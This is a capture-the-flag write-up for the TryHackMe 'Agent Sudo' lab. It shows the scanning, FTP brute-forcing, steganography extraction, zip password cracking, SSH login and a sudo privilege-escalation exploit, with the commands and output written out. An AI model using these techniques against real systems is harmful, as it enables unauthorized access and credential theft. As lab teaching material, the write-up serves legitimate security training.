Agent Sudo :

You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth. 

# Task 2 : Enumerate
```
# Nmap 7.91 scan initiated Mon Jun 14 08:02:14 2021 as: nmap -sC -sV -A -oN scans/nmap-scan 10.10.169.116
Nmap scan report for 10.10.169.116
Host is up (0.19s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Annoucement
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jun 14 08:02:48 2021 -- 1 IP address (1 host up) scanned in 33.70 seconds
```
## How many open ports?
In nmap scan we got port 21 ftp open, 22 ssh open ubuntu and port 80 website named **Annoucement**.

---web---

In port 80 you can see this message.txt :

**Use your own codename as user-agent to access the site.** 

## How you redirect yourself to a secret page?
After we change the user-agent: to C you redirected to this site

http://10.10.169.116/agent_C_attention.php

## What is the agent name?
In our secret page we can see this message to chris user.
```
Attention chris, 

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!

From,
Agent R 
```
# Task 3 : Hash cracking and brute-force 
## FTP password
Let's bruteforce the ftp server with hydra. 

ftp server credentials :
* host: 10.10.169.116   
* login: chris   
* password: crystal

After we logged in you can see these three files. Let's grab them to our system.
```bash
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
```
In that **To_agentJ.txt** file. You can see this hint
```bash
┌─[visith@parrot]─[~/CTF/thm/Agent-sudo/ftp]
└──╼ $cat To_agentJ.txt 
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```
Let's investigate our pictures. First I tried **cute-alien.jpg** with steghide.

```bash
┌─[✗]─[visith@parrot]─[~/CTF/thm/Agent-sudo/ftp]
└──╼ $steghide info cute-alien.jpg 
"cute-alien.jpg":
  format: jpeg
  capacity: 1.8 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
steghide: could not extract any data with that passphrase!
```
Looks like this image need a passphrase. Let's use binwalk to look at other image because steghide not supporting to png format file.

## Zip file password
```bash
┌─[✗]─[visith@parrot]─[~/CTF/thm/Agent-sudo/ftp]
└──╼ $binwalk cutie.png 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22

```
We got a encrypted zip archive and in that archive we got text file. Let's extract this with binwalk. (use -e to extract)

Let's crack the zip password with **john the ripper**.

```bash
┌─[visith@parrot]─[~/CTF/thm/Agent-sudo/ftp/_cutie.png.extracted]
└──╼ $zip2john 8702.zip > zip-hash
ver 81.9 8702.zip/To_agentR.txt is not encrypted, or stored with non-handled compression type
┌─[visith@parrot]─[~/CTF/thm/Agent-sudo/ftp/_cutie.png.extracted]
└──╼ $cat zip-hash 
8702.zip/To_agentR.txt:$zip2$*0*1*0*4673cae714579045*67aa*4e*61c4cf3af94e649f827e5964ce575c5f7a239c48fb992c8ea8cbffe51d03755e0ca861a5a3dcbabfa618784b85075f0ef476c6da8261805bd0a4309db38835ad32613e3dc5d7e87c0f91c0b5e64e*4969f382486cb6767ae6*$/zip2$:To_agentR.txt:8702.zip:8702.zip
┌─[visith@parrot]─[~/CTF/thm/Agent-sudo/ftp/_cutie.png.extracted]
└──╼ $john --wordlist=/opt/seclist/rockyou.txt zip-hash 
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alien            (8702.zip/To_agentR.txt)
1g 0:00:00:00 DONE (2021-06-14 09:12) 2.564g/s 63015p/s 63015c/s 63015C/s christal..280789
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
We got the password for zip archive. 

* Credentails : alien

```bash
┌─[✗]─[visith@parrot]─[~/CTF/thm/Agent-sudo/ftp/_cutie.png.extracted]
└──╼ $7z x 8702.zip 

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs Intel(R) Core(TM) i7-10750H CPU @ 2.60GHz (A0652),ASM,AES-NI)

Scanning the drive for archives:
1 file, 280 bytes (1 KiB)

Extracting archive: 8702.zip
--
Path = 8702.zip
Type = zip
Physical Size = 280

    
Enter password (will not be echoed):
Everything is Ok    

Size:       86
Compressed: 280
```
## steg password
In that archive we got that txt. Let's read our txt file.

```
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```
Looks like **QXJlYTUx** this encode by base64. Let's decrypt it.

```bash
┌─[visith@parrot]─[~/CTF/thm/Agent-sudo/ftp]
└──╼ $echo 'QXJlYTUx' | base64 -d
Area51┌─[visith@parrot]─[~/CTF/thm/Agent-sudo/ftp]
└──╼ $
```
We got **"Area51"**. Let's try this "Area51" as that cute-alien.jpg passphrase.
```bash
┌─[visith@parrot]─[~/CTF/thm/Agent-sudo/ftp]
└──╼ $steghide extract -sf cute-alien.jpg 
Enter passphrase: 
wrote extracted data to "message.txt".
```
## Who is the other agent (in full name)?
In that message.txt we can see this txt. 
```
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```
## SSH password
Now we can ssh to james. 

Our credentials:
* user : james
* password : hackerrules!

# Task 4 : Capture the user flag 

## What is the user flag?
```bash
┌─[visith@parrot]─[~/CTF/thm/Agent-sudo]
└──╼ $ssh james@10.10.169.116 
james@10.10.169.116's password: 
james@agent-sudo:~$ ls
Alien_autospy.jpg  user_flag.txt
james@agent-sudo:~$ cat user_flag.txt 
b03d975e8c92a7c****************
```
## What is the incident of the photo called?
We get our user flag. Let's see what is that **Alien_autospy.jpg** file.
After view that image. I reverse image search this. 

----fox---

# Task 5 Privilege escalation 
Now let's try to get in to root. Before we run any of the scripts we can look what we can run as a root.
```bash
james@agent-sudo:~$ sudo -l -l
[sudo] password for james: 
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:

Sudoers entry:
    RunAsUsers: ALL, !root
    Commands:
	/bin/bash
james@agent-sudo:~$ sudo /bin/bash
Sorry, user james is not allowed to execute '/bin/bash' as root on agent-sudo.
james@agent-sudo:~$ 
```
## CVE number for the escalation 
User james cannot execute **/bin/bash** . Let's run linpeas.

---linpeas---

We can search this sudo version can be exploit. After some time I found this exploit.

ExploitDB : https://www.exploit-db.com/exploits/47502

## What is the root flag?

Let's see this exploit in action.
```bash
james@agent-sudo:/dev/shm$ python3 sudo-exploit.py 
Enter current username :james
Lets hope it works
root@agent-sudo:/dev/shm# cd /root
root@agent-sudo:/root# ls
root.txt
```
## (Bonus) Who is Agent R?
```bash
root@agent-sudo:/root# cat root.txt 
To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 

Your flag is 
b53a02f55b57d44*****************

By,
DesKel a.k.a Agent R
```
We pwn it...

Happy hacking & Thx for reading